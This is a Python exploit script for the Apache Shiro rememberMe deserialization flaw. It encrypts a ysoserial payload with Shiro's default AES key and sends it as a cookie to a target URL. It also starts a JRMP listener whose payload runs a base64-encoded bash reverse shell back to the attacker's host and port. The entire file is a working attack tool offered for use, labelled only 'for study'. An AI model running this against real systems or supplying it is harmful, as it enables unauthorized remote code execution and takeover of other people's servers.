# -*- coding: utf-8 -*-
import requests
import os
import signal
import sys
import uuid
import base64
import time
import subprocess
import argparse
from Crypto.Cipher import AES
#get a rememberme payload
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

#httpsender
def httpsender(url,headers):
    try:
        response = requests.get(url,headers=headers)
        if response.status_code == 200:
            print("Exploit target IP")
        else:
            print("Something happend, got status_code : "+response.status_code)
    except Exception:
        print("requests error : may be Connect error<")
#exp for shiro to get a shell

def exp_shiro(url,cmd):
    payload = encode_rememberme(cmd)
    print("rememberMe={0}".format(payload.decode()))
    headers={
        #"Host": "192.168.99.100:8081",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cookie": "JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()),
        "Upgrade-Insecure-Requests": "1"
    }
    httpsender(url,headers)
def javalisten(lhost,lport_listen):
    listenshell="bash -i >& /dev/tcp/{0}/{1} 0>&1".format(lhost,lport_listen)
    encode_ls=str(base64.b64encode(listenshell.encode('utf-8')),'utf-8')
    print(encode_ls)
    execmd='java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections2 "bash -c {echo,'+encode_ls+'}|{base64,-d}|{bash,-i}"'
    print(execmd)
    p=subprocess.Popen(execmd,shell=True, stdout=subprocess.PIPE,close_fds=True, preexec_fn = os.setsid)
    return p
parser = argparse.ArgumentParser(description='shiro_exp U can getshell Only for study ',epilog="python shiro_exp.py -u [url] -lh [localhost] -lp [localport]")
parser.add_argument('--url', '-u', help='目的站点的url',required=True)
parser.add_argument('--lhost', '-lh', help='本地监听主机IP地址',required=True)
parser.add_argument('--lport', '-lp', help='本机监听主机PORT端口',required=True)
args = parser.parse_args()


if __name__=='__main__':
    try:
        rmiserver="{0}:3888".format(args.lhost)
        p=javalisten(args.lhost,args.lport)
        time.sleep(5)
        exp_shiro(args.url,rmiserver)
        os.killpg(p.pid,signal.SIGUSR1)
    except Exception as e:
        print(e)